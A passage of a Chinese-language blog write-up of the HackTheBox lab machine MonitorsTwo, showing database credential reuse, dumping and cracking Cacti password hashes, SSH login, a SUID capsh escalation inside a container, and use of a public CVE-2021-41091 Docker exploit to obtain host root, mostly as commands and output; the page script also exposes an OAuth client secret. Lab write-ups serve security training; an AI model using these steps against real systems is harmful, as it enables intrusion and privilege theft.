class="hljs-string">&#x27;mysql&#x27;</span>;<br><span class="hljs-variable">$database_default</span>  = <span class="hljs-string">&#x27;cacti&#x27;</span>;<br><span class="hljs-variable">$database_hostname</span> = <span class="hljs-string">&#x27;db&#x27;</span>;<br><span class="hljs-variable">$database_username</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$database_password</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$database_port</span>     = <span class="hljs-string">&#x27;3306&#x27;</span>;<br><span class="hljs-variable">$database_retries</span>  = 5;<br><span class="hljs-variable">$database_ssl</span>      = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$database_ssl_key</span>  = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$database_ssl_cert</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$database_ssl_ca</span>   = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$database_persist</span>  = <span class="hljs-literal">false</span>;<br><br>/*<br> * When the cacti server is a remote poller, <span class="hljs-keyword">then</span> these entries point to<br> * the main cacti server. Otherwise, these variables have no use and<br> * must remain commented out.<br> */<br><br><span class="hljs-comment">#$rdatabase_type     = &#x27;mysql&#x27;;</span><br><span class="hljs-comment">#$rdatabase_default  = &#x27;cacti&#x27;;</span><br><span class="hljs-comment">#$rdatabase_hostname = &#x27;localhost&#x27;;</span><br><span class="hljs-comment">#$rdatabase_username = &#x27;cactiuser&#x27;;</span><br><span class="hljs-comment">#$rdatabase_password = &#x27;cactiuser&#x27;;</span><br><span class="hljs-comment">#$rdatabase_port     = &#x27;3306&#x27;;</span><br><span class="hljs-comment">#$rdatabase_retries  = 5;</span><br><span class="hljs-comment">#$rdatabase_ssl      = false;</span><br><span class="hljs-comment">#$rdatabase_ssl_key  = &#x27;&#x27;;</span><br><span class="hljs-comment">#$rdatabase_ssl_cert = &#x27;&#x27;;</span><br><span class="hljs-comment">#$rdatabase_ssl_ca   = &#x27;&#x27;;</span><br><br></code></pre></td></tr></table></figure>

<p>文件的前面部分就给了我们想要的足够的信息：数据库的登录用户和密码。</p>
<p>那我们就高高兴兴的登录，却发现会报错。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/sbin$ mysql -uroot -p<br>mysql -uroot -p<br>Enter password: root<br>ERROR 2002 (HY000): Can<span class="hljs-string">&#x27;t connect to local MySQL server through socket &#x27;</span>/run/mysqld/mysqld.sock<span class="hljs-string">&#x27; (2)</span><br></code></pre></td></tr></table></figure>

<p>其实仔细一点就会发现，配置文件里面说明了<code>$database_hostname = &#39;db&#39;;</code>，我们要用的数据库hostname是db，要明确指定出来，否则会用默认的hostname也就是localhost，而配置文件配置了localhost为远程使用，本地登不了。指定了就能登了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/sbin$ mysql --host=db -uroot -proot<br>mysql --host=db -uroot -proot<br>show databases;<br><span class="hljs-built_in">exit</span><br>Database<br>information_schema<br>cacti<br>mysql<br>performance_schema<br>sys<br></code></pre></td></tr></table></figure>

<p>然而登上去了还会有问题，我们输了命令之后没回显，只有再退出时才会有回显，这是因为当前shell环境交互有问题，无法正常的交互。而且机子内没有python环境，不能生成一个交互性更好的shell。所以我们要用非交互式查询。这个平时基本上谁不用交互式啊，非交互式咋弄的请教一下chatgpt吧。</p>
<p class='item-img' data-src='/pic/assets/e404da7252714381deec3a5c7607473e.png'><img src="/pic/assets/e404da7252714381deec3a5c7607473e.png" alt="e404da7252714381deec3a5c7607473e"></p>
<p>我们用<code>-e</code>选项就行。那就直接开查：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/sbin$ mysql --host=db -uroot -proot -e <span class="hljs-string">&quot;show tables&quot;</span> cacti<br>&lt;ysql --host=db -uroot -proot -e <span class="hljs-string">&quot;show tables&quot;</span> cacti<br>Tables_in_cacti<br>aggregate_graph_templates<br>aggregate_graph_templates_graph<br>aggregate_graph_templates_item<br>aggregate_graphs<br>aggregate_graphs_graph_item<br>aggregate_graphs_items<br>automation_devices<br>automation_graph_rule_items<br>automation_graph_rules<br>automation_ips<br>automation_match_rule_items<br>automation_networks<br>automation_processes<br>automation_snmp<br>automation_snmp_items<br>automation_templates<br>automation_tree_rule_items<br>automation_tree_rules<br>cdef<br>cdef_items<br>color_template_items<br>color_templates<br>colors<br>data_debug<br>data_input<br>data_input_data<br>data_input_fields<br>data_local<br>data_source_profiles<br>data_source_profiles_cf<br>data_source_profiles_rra<br>data_source_purge_action<br>data_source_purge_temp<br>data_source_stats_daily<br>data_source_stats_hourly<br>data_source_stats_hourly_cache<br>data_source_stats_hourly_last<br>data_source_stats_monthly<br>data_source_stats_weekly<br>data_source_stats_yearly<br>data_template<br>data_template_data<br>data_template_rrd<br>external_links<br>graph_local<br>graph_template_input<br>graph_template_input_defs<br>graph_templates<br>graph_templates_gprint<br>graph_templates_graph<br>graph_templates_item<br>graph_tree<br>graph_tree_items<br>host<br>host_graph<br>host_snmp_cache<br>host_snmp_query<br>host_template<br>host_template_graph<br>host_template_snmp_query<br>plugin_config<br>plugin_db_changes<br>plugin_hooks<br>plugin_realms<br>poller<br>poller_command<br>poller_data_template_field_mappings<br>poller_item<br>poller_output<br>poller_output_boost<br>poller_output_boost_local_data_ids<br>poller_output_boost_processes<br>poller_output_realtime<br>poller_reindex<br>poller_resource_cache<br>poller_time<br>processes<br>reports<br>reports_items<br>sessions<br>settings<br>settings_tree<br>settings_user<br>settings_user_group<br>sites<br>snmp_query<br>snmp_query_graph<br>snmp_query_graph_rrd<br>snmp_query_graph_rrd_sv<br>snmp_query_graph_sv<br>snmpagent_cache<br>snmpagent_cache_notifications<br>snmpagent_cache_textual_conventions<br>snmpagent_managers<br>snmpagent_managers_notifications<br>snmpagent_mibs<br>snmpagent_notifications_log<br>user_auth<br>user_auth_cache<br>user_auth_group<br>user_auth_group_members<br>user_auth_group_perms<br>user_auth_group_realm<br>user_auth_perms<br>user_auth_realm<br>user_domains<br>user_domains_ldap<br>user_log<br>vdef<br>vdef_items<br>version<br></code></pre></td></tr></table></figure>

<p>我们显然对<code>usr_auth</code>表感兴趣，查他</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/sbin$ mysql --host=db -uroot -proot -e <span class="hljs-string">&quot;select * from user_auth&quot;</span> cacti<br>&lt;db -uroot -proot -e <span class="hljs-string">&quot;select * from user_auth&quot;</span> cacti<br><span class="hljs-built_in">id</span>      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview   graph_settings   login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history       locked   failed_attempts lastfail        reset_perms<br>1       admin   $2y$10<span class="hljs-variable">$u8Xomk2jjbuJI3MW5TudHeytPPuaWYuNs2S2bTtiD8VW0SIp2TMwe</span>    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on     on       2       1       1       1       1       on      -1      -1      -1              0       0       663348655<br>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1              -1       -1      -1              0       0       0<br>4       marcus  $2y$10<span class="hljs-variable">$vcrYth5YcCLlZaPDj6PwqOYTw68W1</span>.************************    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on     on       1       1       1       1       1       on      -1      -1              on      0       0       2135691668<br></code></pre></td></tr></table></figure>

<p>发现3个用户的密码，丢去<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">hashes</a>网站去破解一下看看。</p>
<p class='item-img' data-src='/pic/assets/e3f6b47421264f110e37eb682eff52a1.png'><img src="/pic/assets/e3f6b47421264f110e37eb682eff52a1.png" alt="e3f6b47421264f110e37eb682eff52a1"></p>
<p>我们发现了guest和marcus用户的密码，但是admin的没破解出来。那我们接着把admin的密码丢到john里破解一下。接着，我们用guest和marcus登录下网站，发现都登不进去，marcus密码对但是提示没权限访问。</p>
<p>事已至此，试试ssh。我们可以发现marcus的密钥可以成功登录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh marcus@10.10.11.211<br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.211 (10.10.11.211)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.211<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">marcus@10.10.11.211&#x27;</span>s password:<br>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Tue 18 Jul 2023 08:22:44 AM UTC<br><br>  System load:                      0.02<br>  Usage of /:                       63.4% of 6.73GB<br>  Memory usage:                     19%<br>  Swap usage:                       0%<br>  Processes:                        247<br>  Users logged <span class="hljs-keyword">in</span>:                  1<br>  IPv4 address <span class="hljs-keyword">for</span> br-60ea49c21773: 172.18.0.1<br>  IPv4 address <span class="hljs-keyword">for</span> br-7c3b7c0d00b3: 172.19.0.1<br>  IPv4 address <span class="hljs-keyword">for</span> docker0:         172.17.0.1<br>  IPv4 address <span class="hljs-keyword">for</span> eth0:            10.10.11.211<br><br><br>Expanded Security Maintenance <span class="hljs-keyword">for</span> Applications is not enabled.<br><br>0 updates can be applied immediately.<br><br>Enable ESM Apps to receive additional future security updates.<br>See https://ubuntu.com/esm or run: sudo pro status<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>You have mail.<br>Last login: Tue Jul 18 08:21:07 2023 from 10.10.14.58<br>marcus@monitorstwo:~$ <br></code></pre></td></tr></table></figure>

<p>那直接在home目录下拿下user flag。</p>
<h3 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h3><p>拿下了user flag自然很高兴，但是高兴之余别忘了一些细节。比如千万别养成ssh登进来就直接clear清屏的习惯。motd提示当前用户有邮件。那我们真得看看，邮件经常会泄露信息，不得不品尝。mail的目录在&#x2F;var&#x2F;mail。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:/var/mail$ <span class="hljs-built_in">cat</span> marcus<br>From: administrator@monitorstwo.htb<br>To: all@monitorstwo.htb<br>Subject: Security Bulletin - Three Vulnerabilities to be Aware Of<br><br>Dear all,<br><br>We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.<br><br>CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting <span class="hljs-keyword">for</span> the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.<br><br>CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews <span class="hljs-keyword">in</span> the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting <span class="hljs-keyword">in</span> the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.<br><br>CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker <span class="hljs-keyword">for</span> software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed <span class="hljs-keyword">in</span> Moby (Docker Engine) version 20.10.9, and <span class="hljs-built_in">users</span> should update to this version as soon as possible. Please note that running containers should be stopped and restarted <span class="hljs-keyword">for</span> the permissions to be fixed.<br><br>We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please <span class="hljs-keyword">do</span> not hesitate to contact our IT department.<br><br>Best regards,<br><br>Administrator<br>CISO<br>Monitor Two<br>Security Team<br></code></pre></td></tr></table></figure>

<p>上来就给我们报了3个CVE。大致看了下介绍，CVE-2021-33033是linux内核漏洞的利用，我们<code>uname -a</code>可以看到当前内核版本是5.4，但是内核提权稳定性让我们先不去考虑它。CVE-2020-25706是cacti的xss漏洞，提权用不上，不看。CVE-2021-41091是Moby（一种docker引擎）的漏洞，我们查了一下发现可以用于提权。github上有详细的<a target="_blank" rel="noopener" href="https://github.com/UncleJ4ck/CVE-2021-41091/tree/main">PoC</a>介绍,那我们按照说明尝试下利用。</p>
<h4 id="CVE-2021-41091"><a href="#CVE-2021-41091" class="headerlink" title="CVE-2021-41091"></a>CVE-2021-41091</h4><ol>
<li><p>第一步是要获取docker内的root权限并将内部的<code>/bin/bash</code>设置s位权限。</p>
<p>聪明的我们之前的反弹shell并没关。那docker内提权也还是同一个思路，先三板斧：<code>sudo -l</code>没权限，<code>find / -type f -perm -04000 2&gt;/dev/null</code>这次支棱起来了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/var/www/html$ find / -<span class="hljs-built_in">type</span> f -perm -04000 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 2&gt;/dev/null<br>/usr/bin/gpasswd<br>/usr/bin/passwd<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/sbin/capsh<br>/bin/mount<br>/bin/umount<br>/bin/bash<br>/bin/su<br></code></pre></td></tr></table></figure>

<p>我们可以发现有个capsh不是很熟悉，其他都是老演员了。我们直接去gtfobins上查capsh的户口，发现其有利用方式<code>./capsh --gid=0 --uid=0 --</code>，那直接来吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/var/www/html$ <span class="hljs-built_in">cd</span> /sbin<br><span class="hljs-built_in">cd</span> /sbin<br>www-data@50bca5e748b0:/sbin$ ./capsh --gid=0 --uid=0 --<br>./capsh --gid=0 --uid=0 --<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">chmod</span> u+s /bin/bash<br><span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash<br></code></pre></td></tr></table></figure>

<p>第一步搞定。</p>
</li>
<li><p>第二步就是执行我们的EXP。<a target="_blank" rel="noopener" href="https://github.com/UncleJ4ck/CVE-2021-41091/tree/main/exp.sh">exp.sh</a>直接从github复制或者下载下来都行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">marcus@monitorstwo:/tmp$ ./exp.sh<br>[!] Vulnerable to CVE-2021-41091<br>[!] Now connect to your Docker container that is accessible and obtain root access !<br>[&gt;] After gaining root access execute this <span class="hljs-built_in">command</span> (<span class="hljs-built_in">chmod</span> u+s /bin/bash)<br><br>Did you correctly <span class="hljs-built_in">set</span> the setuid bit on /bin/bash <span class="hljs-keyword">in</span> the Docker container? (<span class="hljs-built_in">yes</span>/no): <span class="hljs-built_in">yes</span><br>[!] Available Overlay2 Filesystems:<br>/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged<br>/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged<br><br>[!] Iterating over the available Overlay2 filesystems !<br>[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged<br>[x] Could not get root access <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged&#x27;</span><br><br>[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged<br>[!] Rooted !<br>[&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged<br>[?] If it didn<span class="hljs-string">&#x27;t spawn a shell go to this path and execute &#x27;</span>./bin/bash -p<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] Spawning Shell</span><br><span class="hljs-string">bash-5.1# exit</span><br><span class="hljs-string">marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged</span><br><span class="hljs-string">marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p</span><br><span class="hljs-string">bash-5.1# whoami</span><br><span class="hljs-string">root</span><br><span class="hljs-string">bash-5.1#  cd /root</span><br><span class="hljs-string">bash-5.1# ls -la</span><br><span class="hljs-string">total 36</span><br><span class="hljs-string">drwx------  6 root root 4096 Mar 22 13:21 .</span><br><span class="hljs-string">drwxr-xr-x 19 root root 4096 Mar 22 13:21 ..</span><br><span class="hljs-string">lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -&gt; /dev/null</span><br><span class="hljs-string">-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc</span><br><span class="hljs-string">drwx------  2 root root 4096 Mar 22 13:21 .cache</span><br><span class="hljs-string">drwxr-xr-x  2 root root 4096 Mar 22 13:21 cacti</span><br><span class="hljs-string">drwxr-xr-x  3 root root 4096 Mar 22 13:21 .local</span><br><span class="hljs-string">-rw-r--r--  1 root root  161 Dec  5  2019 .profile</span><br><span class="hljs-string">-rw-r-----  1 root root   33 Jul 18 05:27 root.txt</span><br><span class="hljs-string">drwx------  2 root root 4096 Mar 22 13:21 .ssh</span><br></code></pre></td></tr></table></figure>

<p>成功拿下root flag！</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体还是比较简单，没啥特别卡人的点，比较友好。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/17/PC/">[HTB]  PC Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">2.2.</span> <span class="toc-text">whatweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">2.3.</span> <span class="toc-text">nikto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="toc-number">3.1.</span> <span class="toc-text">服务识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cacti-RCE"><span class="toc-number">3.2.</span> <span class="toc-text">Cacti RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%9E%84%E5%BB%BA"><span class="toc-number">4.1.</span> <span class="toc-text">思路构建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0user%E6%9D%83%E9%99%90"><span class="toc-number">4.2.</span> <span class="toc-text">拿到user权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E6%9D%83%E9%99%90"><span class="toc-number">4.3.</span> <span class="toc-text">root权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-41091"><span class="toc-number">4.3.1.</span> <span class="toc-text">CVE-2021-41091</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>